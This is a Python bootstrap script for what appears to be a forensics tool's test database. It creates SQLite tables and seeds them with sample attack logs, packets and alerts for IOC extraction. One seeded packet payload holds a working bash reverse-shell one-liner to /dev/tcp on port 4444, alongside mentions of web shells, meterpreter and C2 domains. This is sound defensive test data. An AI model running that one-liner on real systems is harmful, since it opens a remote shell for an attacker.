"""
bootstrap_db.py  — Minimal DB bootstrap for Phase 8 standalone testing.
Creates required tables (log_events, network_packets, alerts, iocs)
and populates them with enough sample data to demonstrate IOC extraction.
"""

import sqlite3
import os
from pathlib import Path
from datetime import datetime

BASE_DIR = Path(__file__).parent
DB_DIR   = BASE_DIR / "database"
DB_PATH  = DB_DIR / "dfir.db"

def bootstrap():
    DB_DIR.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c    = conn.cursor()

    # ── evidence_files ───────────────────────────────────────────────
    c.execute("""
        CREATE TABLE IF NOT EXISTS evidence_files (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            filename     TEXT,
            filepath     TEXT,
            file_type    TEXT,
            sha256_hash  TEXT,
            size_bytes   INTEGER,
            collected_at TEXT,
            collector    TEXT,
            status       TEXT DEFAULT 'ACTIVE'
        )
    """)

    # ── log_events ───────────────────────────────────────────────────
    c.execute("""
        CREATE TABLE IF NOT EXISTS log_events (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp   TEXT,
            event_type  TEXT,
            raw_line    TEXT,
            source_file TEXT,
            source_ip   TEXT,
            username    TEXT,
            severity    TEXT DEFAULT 'INFO'
        )
    """)

    # ── network_packets ──────────────────────────────────────────────
    c.execute("""
        CREATE TABLE IF NOT EXISTS network_packets (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp       TEXT,
            src_ip          TEXT,
            dst_ip          TEXT,
            src_port        INTEGER,
            dst_port        INTEGER,
            protocol        TEXT,
            length          INTEGER,
            info            TEXT,
            payload_preview TEXT,
            flags           TEXT
        )
    """)

    # ── alerts ───────────────────────────────────────────────────────
    c.execute("""
        CREATE TABLE IF NOT EXISTS alerts (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp   TEXT,
            alert_type  TEXT,
            severity    TEXT,
            source_ip   TEXT,
            description TEXT,
            details     TEXT,
            status      TEXT DEFAULT 'OPEN'
        )
    """)

    # ── iocs (created by ioc_extractor, but ensure it exists) ────────
    c.execute("""
        CREATE TABLE IF NOT EXISTS iocs (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            ioc_type      TEXT NOT NULL,
            ioc_value     TEXT NOT NULL,
            source        TEXT,
            source_line   TEXT,
            confidence    TEXT DEFAULT 'MEDIUM',
            tags          TEXT,
            first_seen    TEXT,
            last_seen     TEXT,
            count         INTEGER DEFAULT 1,
            enriched      INTEGER DEFAULT 0,
            UNIQUE(ioc_type, ioc_value)
        )
    """)

    # ── seed log_events ──────────────────────────────────────────────
    sample_logs = [
        ("2024-01-15 02:14:33", "AUTH_FAIL",
         "Failed password for root from 185.220.101.47 port 49823 ssh2",
         "auth.log", "185.220.101.47", "root"),
        ("2024-01-15 02:14:35", "AUTH_FAIL",
         "Failed password for admin from 185.220.101.47 port 49824 ssh2",
         "auth.log", "185.220.101.47", "admin"),
        ("2024-01-15 02:14:37", "AUTH_FAIL",
         "Failed password for root from 45.33.32.156 port 12345 ssh2",
         "auth.log", "45.33.32.156", "root"),
        ("2024-01-15 02:16:10", "WEB_ACCESS",
         'GET /wp-login.php HTTP/1.1 200 - 91.108.4.23 "sqlmap/1.6.0"',
         "apache.log", "91.108.4.23", None),
        ("2024-01-15 02:17:00", "WEB_ACCESS",
         'POST /shell.php HTTP/1.1 200 - 91.108.4.23 "curl/7.68.0"',
         "apache.log", "91.108.4.23", None),
        ("2024-01-15 02:18:45", "DNS",
         "DNS query for malware-c2.xyz from 192.168.1.100",
         "dns.log", "192.168.1.100", None),
        ("2024-01-15 02:19:00", "NETWORK",
         "Outbound connection to 194.165.16.20:4444 reverse shell suspected",
         "firewall.log", "192.168.1.100", None),
        ("2024-01-15 02:21:00", "EXPLOIT",
         "CVE-2021-44228 exploit attempt from 45.155.205.233",
         "ids.log", "45.155.205.233", None),
        ("2024-01-15 02:22:30", "SCAN",
         "User-Agent: Masscan/1.3 from 89.248.172.16",
         "apache.log", "89.248.172.16", None),
        ("2024-01-15 02:24:00", "EMAIL",
         "Email received from attacker@evil.tk with malware attachment",
         "mail.log", None, None),
        ("2024-01-15 02:26:00", "C2",
         "Connection to known C2: update-service.ml:8080",
         "firewall.log", "192.168.1.100", None),
        ("2024-01-15 02:27:00", "SCAN",
         "Nmap scan detected from 203.0.113.42",
         "ids.log", "203.0.113.42", None),
    ]

    for entry in sample_logs:
        c.execute("""
            INSERT OR IGNORE INTO log_events
                (timestamp, event_type, raw_line, source_file, source_ip, username)
            VALUES (?, ?, ?, ?, ?, ?)
        """, entry)

    # ── seed network_packets ─────────────────────────────────────────
    packets = [
        ("2024-01-15 02:14:33", "185.220.101.47", "192.168.1.10",
         49823, 22, "TCP", 64, "SSH brute-force attempt", "SSH-2.0", "SYN"),
        ("2024-01-15 02:17:00", "91.108.4.23", "192.168.1.10",
         55000, 80, "HTTP", 512,
         "POST /shell.php HTTP/1.1", "bash -i >& /dev/tcp/91.108.4.23/4444", "PSH,ACK"),
        ("2024-01-15 02:19:00", "192.168.1.100", "194.165.16.20",
         50000, 4444, "TCP", 128, "Reverse shell C2 beacon",
         "meterpreter session", "PSH,ACK"),
        ("2024-01-15 02:27:00", "203.0.113.42", "192.168.1.10",
         60000, 80, "TCP", 40, "Nmap SYN scan", "", "SYN"),
    ]
    for p in packets:
        c.execute("""
            INSERT OR IGNORE INTO network_packets
                (timestamp, src_ip, dst_ip, src_port, dst_port,
                 protocol, length, info, payload_preview, flags)
            VALUES (?,?,?,?,?,?,?,?,?,?)
        """, p)

    # ── seed alerts ──────────────────────────────────────────────────
    now = datetime.now().isoformat()
    alerts_data = [
        (now, "BRUTE_FORCE", "HIGH", "185.220.101.47",
         "SSH brute-force from 185.220.101.47",
         '{"attempts": 47, "usernames": ["root","admin"]}'),
        (now, "WEB_ATTACK", "CRITICAL", "91.108.4.23",
         "Web shell upload detected from 91.108.4.23",
         '{"path": "/shell.php", "tool": "sqlmap"}'),
        (now, "C2_BEACON", "CRITICAL", "192.168.1.100",
         "C2 communication to 194.165.16.20:4444",
         '{"protocol": "TCP", "bytes": 8192}'),
    ]
    for a in alerts_data:
        c.execute("""
            INSERT OR IGNORE INTO alerts
                (timestamp, alert_type, severity, source_ip, description, details)
            VALUES (?,?,?,?,?,?)
        """, a)

    conn.commit()
    conn.close()
    print(f"[+] Database bootstrapped at: {DB_PATH}")
    print("[+] Tables: evidence_files, log_events, network_packets, alerts, iocs")
    print("[+] Sample data seeded.")


if __name__ == "__main__":
    bootstrap()
